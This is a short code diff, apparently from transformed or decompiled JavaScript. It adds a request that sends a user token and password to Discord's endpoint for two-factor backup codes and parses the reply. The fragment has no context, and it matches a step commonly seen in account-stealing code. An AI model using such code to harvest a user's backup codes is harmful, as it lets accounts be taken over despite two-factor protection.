@@ -1,0 +1,10 @@
+(_tmp_11 = fetch("https://discord.com/api/v9/users/@me/mfa/codes", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json",
+            authorization: n
+        },
+        body: JSON.stringify({
+            password: t
+        })
+    })).json
